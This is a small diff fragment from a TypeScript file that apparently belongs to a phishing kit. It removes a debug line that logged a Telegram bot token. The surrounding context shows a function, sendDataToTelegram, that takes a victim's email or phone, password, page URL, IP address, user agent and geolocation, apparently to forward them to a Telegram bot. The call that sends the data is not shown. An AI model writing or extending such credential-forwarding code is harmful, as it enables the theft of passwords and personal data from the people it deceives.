@@ -11,7 +11,6 @@ type MessageData = {
 };
 
 export const sendDataToTelegram = async (messageData: MessageData) => {
-	console.log("TOKENBOT -> ", process.env.BOT_TOKEN)
 	const { emailOrPhone, password, pageUrl, userIp, userAgent, geoLocation } =
 		messageData;
 
